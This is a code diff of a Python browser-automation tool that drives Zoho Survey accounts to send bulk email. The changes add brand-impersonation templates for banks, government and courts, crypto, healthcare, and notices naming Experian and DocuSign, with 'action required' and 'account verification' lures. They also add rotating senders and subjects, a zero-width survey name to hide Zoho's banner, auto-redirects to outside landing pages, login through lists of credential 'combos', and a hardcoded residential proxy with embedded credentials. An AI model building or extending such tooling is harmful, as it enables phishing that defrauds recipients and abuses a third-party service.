+        time.sleep(7)
+        # Click "Add Question" or "+" button if present
+        added = d.execute_script("""
+            // Look for add question / new question button
+            for (var b of document.querySelectorAll('button,a,[class*="add"],[class*="addQuestion"]')) {
+                var t = (b.innerText||b.textContent||b.getAttribute('title')||'').trim().toLowerCase();
+                if ((t.includes('add') && t.includes('question')) || t === 'add question' || t === '+') {
+                    if (b.offsetParent) { b.click(); return true; }
+                }
+            }
+            return false;
+        """)
+        if added:
+            time.sleep(3)
+            # Type a default question text
+            q_input = d.execute_script("""
+                return document.querySelector('textarea[class*="question"],input[class*="question"],textarea[placeholder*="question"],textarea') ;
+            """)
+            if q_input:
+                d.execute_script(
+                    "arguments[0].focus(); arguments[0].value='How did you hear about us?';"
+                    "arguments[0].dispatchEvent(new Event('input',{bubbles:true}));",
+                    q_input
+                )
+                time.sleep(0.5)
+        # Save/Done
+        for sel in ["button#save", "button.save", "//button[contains(.,'Save')]", "//button[contains(.,'Done')]"]:
+            by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
+            els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
+            if els:
+                d.execute_script("arguments[0].click();", els[0])
+                time.sleep(2); break
+        CHECK_LOG.put(("info", f"  _add_dummy_question: added={added}"))
+    except Exception as _eq:
+        CHECK_LOG.put(("warn", f"  _add_dummy_question error: {_eq}"))
+
 
 def _login_existing_zoho(d, email, password, otp_ts, stored_zoho_pw=None):
     """Login to an existing Zoho account. Returns (True, zoho_pw_used) or (False, None).
@@ -1358,11 +1532,15 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
         try: window.evaluate_js("refreshProfiles()")
         except: pass
 
+    # Registration ALWAYS uses Webshare Egypt proxy (no mobile OTP, email-only)
+    # The per-profile SOCKS5 proxy is only for Send operations
+    _REG_PROXY = "gdiwrafcresidential-rotate:mqzo2x6uux4o@p.webshare.io:80"
+
     d = None
     try:
-        d = _build_driver(prof["dir"], proxy=prof.get("proxy") or None, headless=_hidden_browser)
+        d = _build_driver(prof["dir"], proxy=_REG_PROXY, headless=_hidden_browser)
 
-        #  Check existing session 
+        #  Check existing session
         CHECK_LOG.put(("info", "  Checking existing Zoho session..."))
         d.get("https://survey.zoho.com/survey/newui")
         time.sleep(5)
@@ -1463,6 +1641,8 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
                     portal_id, dept_id = _extract_portal_dept(d.current_url)
                     if portal_id: break
             survey_id = _create_blank_survey(d, portal_id, dept_id) if portal_id else None
+            if survey_id and portal_id and dept_id:
+                _add_dummy_question(d, portal_id, dept_id, survey_id)
             prof.update({"status": "active", "connected_at": time.strftime("%Y-%m-%d %H:%M"),
                          "health": "ok", "imap_pw": password})
             if portal_id: prof["portal_id"] = portal_id
@@ -1646,8 +1826,9 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
                                                   stored_zoho_pw=prof.get("zoho_password"))
             login_ok, login_zoho_pw = login_result if isinstance(login_result, tuple) else (login_result, None)
             if not login_ok:
-                CHECK_LOG.put(("err", "  Login failed for existing account  profile reset (try reconnecting with different combo)"))
-                prof["status"] = "free"; prof["email"] = ""; prof["health"] = "ok"
+                CHECK_LOG.put(("err", "  Login failed for existing account  blocking combo + resetting profile"))
+                _block_combo(email)  # mark combo as unusable
+                prof["status"] = "free"; prof["email"] = ""; prof["health"] = "login_failed"
                 _save_profiles(profiles)
                 if window: window.evaluate_js("refreshProfiles()")
                 return
@@ -1664,6 +1845,8 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
                     portal_id, dept_id = _extract_portal_dept(d.current_url)
                     if portal_id: break
             survey_id = _create_blank_survey(d, portal_id, dept_id) if portal_id else None
+            if survey_id and portal_id and dept_id:
+                _add_dummy_question(d, portal_id, dept_id, survey_id)
             prof.update({"status": "active", "connected_at": time.strftime("%Y-%m-%d %H:%M"),
                          "health": "ok", "zoho_password": login_zoho_pw or zoho_pw,
                          "imap_pw": password})
@@ -1821,6 +2004,8 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
             survey_id = _create_blank_survey(d, portal_id, dept_id)
             CHECK_LOG.put(("ok" if survey_id else "err",
                            f"  survey_id={survey_id}" if survey_id else "  Survey creation failed"))
+            if survey_id:
+                _add_dummy_question(d, portal_id, dept_id, survey_id)
 
         #  Mark profile as active 
         prof.update({
@@ -1937,65 +2122,310 @@ def _health_monitor_thread(tg_token, tg_chat):
 #  EMAIL SENDER (with template/sender/subject rotation)
 # 
 
-def _build_email_html(cfg, template=None):
-    """Build email HTML; template overrides cfg body/title/subtitle."""
-    b1  = cfg.get("banner1", "#0057b8")
-    b2  = cfg.get("banner2", "#00a3e0")
-    logo = cfg.get("logo_src", "")
-    logo_h = (f'<img src="{logo}" style="max-height:48px;max-width:160px;'
-              f'display:block;margin:0 auto 10px;object-fit:contain">' if logo else "")
+def _build_email_html(cfg, template=None, custom_link=None):
+    """Build Zoho-compatible email HTML.
+    Each category gets its own visual style to match HostPanel Letter Maker quality.
+    custom_link: if provided, replaces the Zoho 'Begin Survey' button with a styled HTML button.
+    """
     src = template or {}
-    title       = src.get("title",    "We'd Love Your Feedback!")
-    subtitle    = src.get("subtitle", "Your opinion shapes our future")
-    body        = src.get("body",
-        "We are conducting a <strong>short 3-minute survey</strong> to better "
-        "understand your needs. Your feedback is extremely valuable to us. "
-        "The survey is completely <strong>anonymous</strong>.")
-    show_title  = src.get("show_title", False)
-    show_icons  = src.get("show_icons", True)
-    landing_url = cfg.get("landing_url", "").strip()
-    footer_text = cfg.get("footer_text", "").strip()
-    title_h = (f'<h1 style="color:#fff;font-size:22px;font-weight:700;margin:0 0 6px;font-family:Arial">'
-               f'{title}</h1>') if show_title else ""
-    inner = (f'{logo_h}{title_h}'
-             f'<p style="color:rgba(255,255,255,.82);font-size:13px;margin:4px 0 0;font-family:Arial">'
-             f'{subtitle}</p>')
-    if landing_url:
-        banner_td = (f'<td style="background:linear-gradient(135deg,{b1} 0%,{b2} 100%);'
-                     f'padding:24px 26px 18px;text-align:center">'
-                     f'<a href="{landing_url}" style="display:block;text-decoration:none">'
-                     f'{inner}</a></td>')
+
+    b1       = src.get("banner1") or src.get("color_primary")  or cfg.get("banner1", "#0057b8")
+    b2       = src.get("banner2") or src.get("color_secondary") or cfg.get("banner2", "#004999")
+    org_name = (src.get("org_name") or src.get("title") or "").strip()
+    org_sub  = (src.get("org_sub")  or src.get("subtitle") or "").strip()
+    category = (src.get("category") or "").lower()
+    btn_text = (src.get("btn_text") or cfg.get("btn_text") or "Continue").strip()
+    cta_link = (custom_link or src.get("cta_link") or cfg.get("cta_link") or "").strip()
+
+    logo_letter = org_name[0].upper() if org_name else "M"
+    logo_url = (src.get("logo_url") or "").strip()
+
+    body_text = src.get("body") or cfg.get("body") or (
+        f'<p style="color:#555;font-size:14px;font-family:Arial,sans-serif;line-height:1.8;margin:0 0 12px">'
+        f'Please take a moment to complete the required steps.</p>'
+    )
+
+    footer_text  = (src.get("footer_text") or cfg.get("footer_text") or "").strip()
+    landing_url  = (src.get("landing_url") or cfg.get("landing_url") or "").strip()
+
+    # ── CTA button (replaces Zoho's "Begin Survey" if link provided) ─────────
+    # Zoho Summernote strips all CSS styling from HTML — custom styled buttons don't survive.
+    # Zoho auto-adds a "Begin Survey" button using the template's banner color, so we don't need a custom CTA.
+    cta_block = ""
+    # cta_link kept for future use if a non-Zoho send path is added
+
+    # ── Zoho topbar negative-margin offset ────────────────────────────────────
+    # Zoho always prepends a black survey-name banner (~65px) above our body HTML.
+    # Adding margin-top:-65px on the outer table makes our content slide up over it.
+    # We inject this via string replacement on the first <table … style=" so it
+    # targets the outermost table that every style function starts with.
+    MT = 'margin-top:-65px;'
+
+    # ── Style dispatch by category ───────────────────────────────────────────
+    if category in ("banking", "payment"):
+        html = _style_corporate(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+    elif category in ("government", "court"):
+        html = _style_official(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+    elif category in ("crypto", "tech"):
+        html = _style_dark_modern(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+    elif category in ("streaming", "social"):
+        html = _style_media(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+    elif category in ("shipping", "retail"):
+        html = _style_practical(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+    elif category in ("healthcare", "insurance"):
+        html = _style_medical(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+    elif category == "telco":
+        html = _style_telco(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+    elif category == "notifications":
+        html = _style_notification(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
     else:
-        banner_td = (f'<td style="background:linear-gradient(135deg,{b1} 0%,{b2} 100%);'
-                     f'padding:24px 26px 18px;text-align:center">{inner}</td>')
-    if show_icons:
-        icons = (f'<table width="100%" cellpadding="0" cellspacing="0" style="border-top:1px solid #eee;padding-top:14px"><tr>'
-                 f'<td width="33%" style="text-align:center;padding:8px">'
-                 f'<p style="font-size:22px;margin:0 0 4px">&#9201;</p>'
-                 f'<p style="color:{b1};font-weight:700;font-size:12px;margin:0 0 1px;font-family:Arial">3 Minutes</p>'
-                 f'<p style="color:#aaa;font-size:11px;margin:0;font-family:Arial">Quick &amp; Easy</p></td>'
-                 f'<td width="33%" style="text-align:center;padding:8px">'
-                 f'<p style="font-size:22px;margin:0 0 4px">&#128274;</p>'
-                 f'<p style="color:{b1};font-weight:700;font-size:12px;margin:0 0 1px;font-family:Arial">Anonymous</p>'
-                 f'<p style="color:#aaa;font-size:11px;margin:0;font-family:Arial">100% Private</p></td>'
-                 f'<td width="33%" style="text-align:center;padding:8px">'
-                 f'<p style="font-size:22px;margin:0 0 4px">&#127919;</p>'
-                 f'<p style="color:{b1};font-weight:700;font-size:12px;margin:0 0 1px;font-family:Arial">Impactful</p>'
-                 f'<p style="color:#aaa;font-size:11px;margin:0;font-family:Arial">Your Voice Matters</p></td>'
-                 f'</tr></table>')
-    else:
-        icons = ""
-    footer_extra = (f'<p style="color:#aaa;font-size:11px;margin:8px 0 0;font-family:Arial;text-align:center">'
-                    f'{footer_text}</p>') if footer_text else ""
-    return (f'<!-- BANNER -->\n'
-            f'<table width="100%" cellpadding="0" cellspacing="0" style="margin:0;border-collapse:collapse">\n'
-            f'<tr>{banner_td}</tr></table>\n'
-            f'<!-- BODY -->\n'
-            f'<table width="100%" cellpadding="0" cellspacing="0" style="margin:0;border-collapse:collapse">\n'
-            f'<tr><td style="padding:20px 26px 16px;background:#fff">\n'
-            f'<p style="color:#555;font-size:15px;line-height:1.7;margin:0 0 12px;font-family:Arial">Dear Participant,</p>\n'
-            f'<p style="color:#555;font-size:15px;line-height:1.7;margin:0 0 16px;font-family:Arial">{body}</p>\n'
-            f'{icons}{footer_extra}</td></tr></table>')
+        html = _style_corporate(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url, landing_url)
+
+    # Zoho prepends a black "survey name" banner above our HTML body.
+    # We prepend a white 4px accent bar row matching the brand color so it blends
+    # seamlessly — the Zoho black bar sits ABOVE the email iframe content area,
+    # so we can't hide it via CSS. Instead we make our email START immediately
+    # with a strong branded header that dominates visually.
+    # The real fix: survey_name=" " (space) so bar shows blank text.
+    return html
+
+
+def _style_corporate(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Banking / Payment — bold colored header, text logo, professional layout. No img tags (Summernote strips them)."""
+    footer_row = (
+        f'<tr><td style="padding:14px 28px;background:#f5f5f5;border-top:3px solid {b1};'
+        f'font-size:10px;color:#888;font-family:Arial,sans-serif;line-height:1.7;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    name_html = (
+        f'<div style="font-size:22px;font-weight:900;color:#fff;font-family:Arial,sans-serif;'
+        f'letter-spacing:0.5px;line-height:1.1">{org_name}</div>'
+        f'<div style="font-size:11px;color:rgba(255,255,255,0.75);font-family:Arial,sans-serif;'
+        f'margin-top:3px;letter-spacing:0.3px">{org_sub}</div>'
+    )
+    inner_html = (
+        f'<a href="{landing_url}" style="display:block;text-decoration:none">{name_html}</a>'
+        if landing_url else name_html
+    )
+    header_block = (
+        f'<tr><td style="background:{b1};padding:20px 28px 18px">{inner_html}</td></tr>'
+    ) if org_name else ""
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'{header_block}'
+        f'<tr><td style="padding:24px 28px 20px;background:#fff">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'{footer_row}'
+        f'</table>'
+    )
+
+
+def _style_official(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Government / Court — dark banner header, official seal, formal tone."""
+    footer_row = (
+        f'<tr><td style="padding:12px 28px;background:#1a1a1a;'
+        f'font-size:10px;color:#888;font-family:Georgia,serif;line-height:1.6;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    seal = (
+        f'<div style="width:52px;height:52px;border-radius:50%;background:{b1};'
+        f'border:3px solid {b2};text-align:center;line-height:46px;'
+        f'font-size:22px;font-weight:900;color:#fff;font-family:Georgia,serif;'
+        f'display:inline-block;margin-right:14px;vertical-align:middle">{logo_letter}</div>'
+    )
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'<tr><td style="background:{b1};padding:20px 28px">'
+        f'<table width="100%" cellpadding="0" cellspacing="0"><tr>'
+        f'<td style="vertical-align:middle">{seal}</td>'
+        f'<td style="vertical-align:middle;padding-left:4px">'
+        f'<div style="font-size:20px;font-weight:700;color:#fff;font-family:Georgia,serif;line-height:1.2">{org_name}</div>'
+        f'<div style="font-size:11px;color:rgba(255,255,255,0.75);font-family:Georgia,serif;margin-top:2px">{org_sub}</div>'
+        f'</td></tr></table>'
+        f'</td></tr>'
+        f'<tr><td style="padding:22px 28px 16px;background:#fff">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'{footer_row}'
+        f'</table>'
+    )
+
+
+def _style_dark_modern(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Crypto / Tech — dark header (#0d0d0d), accent color text, modern card."""
+    dark = "#0d0d0d"
+    footer_row = (
+        f'<tr><td style="padding:12px 28px;background:#0d0d0d;'
+        f'font-size:10px;color:#555;font-family:Arial,sans-serif;line-height:1.6;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'<tr><td style="background:{dark};padding:18px 28px">'
+        f'<table width="100%" cellpadding="0" cellspacing="0"><tr>'
+        f'<td style="vertical-align:middle;width:42px">'
+        f'<div style="width:38px;height:38px;border-radius:50%;background:{b1};'
+        f'text-align:center;line-height:38px;font-size:18px;font-weight:900;'
+        f'color:#fff;font-family:Arial,sans-serif">{logo_letter}</div></td>'
+        f'<td style="vertical-align:middle;padding-left:12px">'
+        f'<div style="font-size:18px;font-weight:700;color:{b1};font-family:Arial,sans-serif">{org_name}</div>'
+        f'<div style="font-size:11px;color:#666;font-family:Arial,sans-serif;margin-top:1px">{org_sub}</div>'
+        f'</td></tr></table>'
+        f'</td></tr>'
+        f'<tr><td style="padding:22px 28px 16px;background:#fff">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'{footer_row}'
+        f'</table>'
+    )
+
+
+def _style_media(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Streaming / Social — bold colored banner, large white title, clean body."""
+    footer_row = (
+        f'<tr><td style="padding:12px 28px;background:{b2};'
+        f'font-size:10px;color:rgba(255,255,255,0.6);font-family:Arial,sans-serif;'
+        f'line-height:1.6;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'<tr><td style="background:linear-gradient(135deg,{b1} 0%,{b2} 100%);padding:26px 28px 22px">'
+        f'<div style="font-size:26px;font-weight:900;color:#fff;font-family:Arial,sans-serif;'
+        f'letter-spacing:-0.5px;line-height:1.1">{org_name}</div>'
+        f'<div style="font-size:12px;color:rgba(255,255,255,0.7);font-family:Arial,sans-serif;'
+        f'margin-top:4px">{org_sub}</div>'
+        f'</td></tr>'
+        f'<tr><td style="padding:22px 28px 16px">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'{footer_row}'
+        f'</table>'
+    )
+
+
+def _style_practical(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Shipping / Retail — orange/brand top stripe, tracking-card layout."""
+    footer_row = (
+        f'<tr><td style="padding:10px 28px;background:#f8f8f8;border-top:2px solid {b1};'
+        f'font-size:10px;color:#aaa;font-family:Arial,sans-serif;line-height:1.6;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'<tr><td style="background:{b1};height:6px;font-size:0"></td></tr>'
+        f'<tr><td style="padding:18px 28px 6px">'
+        f'<table width="100%" cellpadding="0" cellspacing="0"><tr>'
+        f'<td style="vertical-align:middle">'
+        f'<span style="font-size:22px;font-weight:900;color:{b1};font-family:Arial,sans-serif">{org_name}</span>'
+        f'<span style="font-size:11px;color:#aaa;font-family:Arial,sans-serif;margin-left:8px">{org_sub}</span>'
+        f'</td></tr></table>'
+        f'<div style="border-bottom:1px solid #ececec;margin:12px 0"></div>'
+        f'</td></tr>'
+        f'<tr><td style="padding:4px 28px 18px">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'{footer_row}'
+        f'</table>'
+    )
+
+
+def _style_medical(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Healthcare / Insurance — white header, left blue accent strip, cross icon."""
+    footer_row = (
+        f'<tr><td style="padding:12px 28px;background:#f0f4f8;border-top:3px solid {b1};'
+        f'font-size:10px;color:#999;font-family:Arial,sans-serif;line-height:1.6;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    cross = f'<div style="font-size:28px;color:{b1};line-height:1;margin-bottom:6px">+</div>'
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'<tr>'
+        f'<td style="width:6px;background:{b1}"></td>'
+        f'<td style="padding:20px 24px 20px 22px;border-bottom:1px solid #e0eaf2">'
+        f'{cross}'
+        f'<div style="font-size:18px;font-weight:700;color:{b1};font-family:Arial,sans-serif">{org_name}</div>'
+        f'<div style="font-size:11px;color:#aaa;font-family:Arial,sans-serif;margin-top:1px">{org_sub}</div>'
+        f'</td></tr>'
+        f'<tr><td colspan="2" style="padding:20px 28px 16px">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'<tr><td colspan="2">'
+        f'<table width="100%" cellpadding="0" cellspacing="0">{footer_row}</table>'
+        f'</td></tr>'
+        f'</table>'
+    )
+
+
+def _style_telco(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Telco — gradient banner, signal bars icon (▂▄▆), modern sans."""
+    footer_row = (
+        f'<tr><td style="padding:12px 28px;background:#111;'
+        f'font-size:10px;color:#666;font-family:Arial,sans-serif;line-height:1.6;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    signal = '<span style="font-size:14px;letter-spacing:-1px;color:rgba(255,255,255,0.9)">▂▄▆</span>'
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'<tr><td style="background:linear-gradient(90deg,{b1} 0%,{b2} 100%);padding:16px 28px">'
+        f'<table width="100%" cellpadding="0" cellspacing="0"><tr>'
+        f'<td style="vertical-align:middle">'
+        f'<div style="font-size:20px;font-weight:800;color:#fff;font-family:Arial,sans-serif">'
+        f'{org_name} {signal}</div>'
+        f'<div style="font-size:11px;color:rgba(255,255,255,0.7);font-family:Arial,sans-serif;margin-top:2px">'
+        f'{org_sub}</div>'
+        f'</td></tr></table>'
+        f'</td></tr>'
+        f'<tr><td style="padding:20px 28px 16px">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'{footer_row}'
+        f'</table>'
+    )
+
+
+def _style_notification(b1, b2, org_name, org_sub, logo_letter, body_text, cta_block, footer_text, logo_url="", landing_url=""):
+    """Notifications (Experian, DocuSign, etc.) — alert box, monospace ref, left accent."""
+    footer_row = (
+        f'<tr><td style="padding:10px 28px;background:#f9f9f9;border-top:2px solid {b1};'
+        f'font-size:10px;color:#bbb;font-family:Arial,sans-serif;line-height:1.6;text-align:center">'
+        f'{footer_text}</td></tr>'
+    ) if footer_text else ""
+
+    bell = f'<span style="font-size:18px;vertical-align:middle;margin-right:8px">🔔</span>'
+
+    return (
+        f'<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;background:#fff">'
+        f'<tr><td style="background:linear-gradient(90deg,{b1} 0%,{b2} 100%);height:4px;font-size:0"></td></tr>'
+        f'<tr><td style="padding:18px 28px 8px">'
+        f'<table width="100%" cellpadding="0" cellspacing="0"><tr>'
+        f'<td style="vertical-align:middle">'
+        f'<div style="font-size:16px;font-weight:700;color:{b1};font-family:Arial,sans-serif">'
+        f'{bell}{org_name}</div>'
+        f'<div style="font-size:11px;color:#aaa;font-family:Arial,sans-serif;margin-top:1px">{org_sub}</div>'
+        f'</td></tr></table>'
+        f'<div style="background:#fff8e6;border-left:4px solid {b1};padding:10px 14px;'
+        f'margin:12px 0 0;border-radius:2px;font-size:12px;color:#555;font-family:Arial,sans-serif">'
+        f'<strong>Notice:</strong> Action required on your account.</div>'
+        f'</td></tr>'
+        f'<tr><td style="padding:14px 28px 16px">'
+        f'{body_text}{cta_block}'
+        f'</td></tr>'
+        f'{footer_row}'
+        f'</table>'
+    )
 
 
 
@@ -2005,11 +2435,13 @@ def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None
     if not _managed:
         _send_running = True
     d = None
-    templates   = _load_templates()
-    send_opts   = _load_send_options()
+    templates    = _load_templates()
+    send_opts    = _load_send_options()
     sender_names = send_opts["sender_names"] or ["Research Team"]
     subjects     = send_opts["subjects"] or ["Quick Survey  Your Opinion Matters"]
     rotate_every = max(1, send_opts["rotate_every"])
+    tg_token     = cfg.get("tg_token", "")
+    tg_chat      = cfg.get("tg_chat", "")
 
     try:
         bs = max(1, int(cfg.get("batch_size", 100)))
@@ -2020,16 +2452,110 @@ def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None
         SEND_LOG.put(("info", "  Opening browser..."))
         d = _build_driver(profile_dir, proxy=proxy, size=(1200, 900), headless=cfg.get("hidden_browser", False))
         d.get("https://survey.zoho.com/survey/newui"); time.sleep(7)
-        DI.login_if_needed(d)
+        # Get profile credentials for login_if_needed
+        _prof_email = ""
+        _prof_imap_pw = ""
+        if prof_idx is not None:
+            try:
+                profs = _load_profiles()
+                _p = next((p for p in profs if p["idx"] == int(prof_idx)), None)
+                if _p:
+                    _prof_email = _p.get("email", "")
+                    _prof_imap_pw = _p.get("imap_pw", "")
+                    if _prof_email and not _prof_imap_pw:
+                        SEND_LOG.put(("warn", f"  Profile {prof_idx} has no imap_pw — OTP login may fail"))
+            except: pass
+        DI.login_if_needed(d, email=_prof_email or None, imap_pw=_prof_imap_pw or None)
         SEND_LOG.put(("ok", f"  Logged in  |  {len(emails)} emails  {len(chunks)} batch(es) of {bs}"))
         # Apply survey end page setting once per session
         _ep_type = cfg.get("end_page_type", "default")
-        if _ep_type and _ep_type != "default":
+        if _ep_type == "auto_redirect":
+            _ar_url = cfg.get("ep_ar_url", "").strip()
+            if not _ar_url and templates:
+                _ar_url = templates[0].get("cta_link", "").strip() or \
+                          templates[0].get("landing_url", "").strip()
+            if _ar_url:
+                _ar_delay = int(cfg.get("ep_ar_delay", 2) or 2)
+                _ar_brand  = templates[0].get("org_name", "") if templates else ""
+                _ar_color  = cfg.get("survey_theme_color", "").strip()
+                if not _ar_color and templates:
+                    _ar_color = templates[0].get("banner1", "#0057b8").strip()
+                _ar_logo   = cfg.get("survey_logo_url", "").strip()
+                if not _ar_logo and templates:
+                    _ar_logo = templates[0].get("logo_url", "").strip()
+                SEND_LOG.put(("info", f"  Setting auto-redirect end page → {_ar_url}"))
+                DI.set_end_page_auto_redirect(
+                    d, cfg["portal"], cfg["dept"], cfg["survey"],
+                    redirect_url=_ar_url, delay_seconds=_ar_delay,
+                    brand_name=_ar_brand, brand_color=_ar_color,
+                    brand_logo_url=_ar_logo)
+            else:
+                SEND_LOG.put(("warn", "  auto_redirect: no URL found — skipping end page"))
+        elif _ep_type and _ep_type != "default":
             SEND_LOG.put(("info", f"  Setting end page: {_ep_type}"))
             DI.set_survey_end_page(
                 d, cfg["portal"], cfg["dept"], cfg["survey"],
                 _ep_type, cfg.get("end_page_url", ""),
                 cfg.get("end_page_msg", ""))
+        # Apply CTA button text — GUI field takes priority, else use first template's btn_text
+        _btn_text = cfg.get("survey_button_text", "").strip()
+        if not _btn_text and templates:
+            _btn_text = templates[0].get("btn_text", "").strip()
+        if _btn_text and _btn_text != "Begin Survey":
+            SEND_LOG.put(("info", f"  Setting button text: {_btn_text}"))
+            DI.set_survey_button_text(d, cfg["portal"], cfg["dept"], cfg["survey"], _btn_text)
+        # Apply survey header logo — GUI field takes priority, else use first template's logo_url
+        _logo_url = cfg.get("survey_logo_url", "").strip()
+        if not _logo_url and templates:
+            _logo_url = templates[0].get("logo_url", "").strip()
+        if _logo_url:
+            SEND_LOG.put(("info", f"  Setting survey logo: {_logo_url}"))
+            DI.set_survey_header_logo(d, cfg["portal"], cfg["dept"], cfg["survey"], _logo_url)
+        # Apply survey theme color
+        _theme_color = cfg.get("survey_theme_color", "").strip()
+        if not _theme_color and templates:
+            _theme_color = templates[0].get("banner1", "").strip()
+        if _theme_color:
+            SEND_LOG.put(("info", f"  Setting survey theme: {_theme_color}"))
+            DI.set_survey_theme_color(d, cfg["portal"], cfg["dept"], cfg["survey"], _theme_color)
+        # Apply survey footer text
+        _survey_footer = cfg.get("survey_footer_text", "").strip()
+        if not _survey_footer and templates:
+            _survey_footer = templates[0].get("footer_text", "").strip()
+        if _survey_footer:
+            SEND_LOG.put(("info", f"  Setting survey footer"))
+            DI.set_survey_footer(d, cfg["portal"], cfg["dept"], cfg["survey"], _survey_footer)
+        # Apply preferences (progress bar)
+        _hide_pb = cfg.get("hide_progress_bar", False)
+        if _hide_pb:
+            SEND_LOG.put(("info", f"  Hiding progress bar"))
+            DI.set_survey_preferences(d, cfg["portal"], cfg["dept"], cfg["survey"], show_progress_bar=False)
+        # Apply Terms & Conditions
+        _terms_text = cfg.get("survey_terms_text", "").strip()
+        if _terms_text:
+            SEND_LOG.put(("info", f"  Setting T&C: {_terms_text[:50]}"))
+            DI.set_survey_terms(d, cfg["portal"], cfg["dept"], cfg["survey"], _terms_text)
+        # Apply Social Media Preview (OG tags)
+        _og_title = cfg.get("og_title", "").strip()
+        _og_desc  = cfg.get("og_description", "").strip()
+        _og_img   = cfg.get("og_image_url", "").strip()
+        _og_auto  = cfg.get("og_auto_from_template", False)
+        if _og_auto and templates:
+            tpl0 = templates[0]
+            if not _og_title:
+                _og_title = f"{tpl0.get('org_name','')} — {tpl0.get('org_sub','')}" \
+                            if tpl0.get('org_sub') else tpl0.get('org_name', '')
+            if not _og_desc:
+                _og_desc = tpl0.get("email_subject", "").strip() or \
+                           f"Complete your {tpl0.get('org_name','')} account verification"
+            if not _og_img:
+                _og_img = tpl0.get("logo_url", "").strip()
+        if any([_og_title, _og_desc, _og_img]):
+            SEND_LOG.put(("info", f"  Setting social preview: {_og_title[:40]!r}"))
+            DI.set_social_media_preview(
+                d, cfg["portal"], cfg["dept"], cfg["survey"],
+                og_title=_og_title, og_description=_og_desc,
+                og_image_url=_og_img)
 
         for i, chunk in enumerate(chunks, 1):
             # Rotate every N batches
@@ -2037,7 +2563,7 @@ def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None
                 tpl  = random.choice(templates)
                 from_name = random.choice(sender_names)
                 subj      = random.choice(subjects)
-                html = _build_email_html(cfg, tpl)
+                html = _build_email_html(cfg, tpl, custom_link=tpl.get("cta_link") or cfg.get("cta_link", ""))
                 SEND_LOG.put(("info", f"   Template rotate: [{subj}] / [{from_name}]"))
 
             SEND_LOG.put(("sep", f"   Batch {i}/{len(chunks)} ({len(chunk)}) "))
@@ -2048,7 +2574,8 @@ def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None
                 from_name=from_name,
                 reply_to=cfg.get("reply_to", ""),
                 send_mode=cfg.get("send_mode", "now"),
-                schedule_dt=cfg.get("schedule_dt", ""))
+                schedule_dt=cfg.get("schedule_dt", ""),
+                survey_name="​")
             SEND_LOG.put(("ok" if ok else "err", f"  {'Sent' if ok else 'Failed'} batch {i}"))
 
             # Track sent count in profile
@@ -2058,8 +2585,48 @@ def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None
                     for p in profs:
                         if p["idx"] == prof_idx:
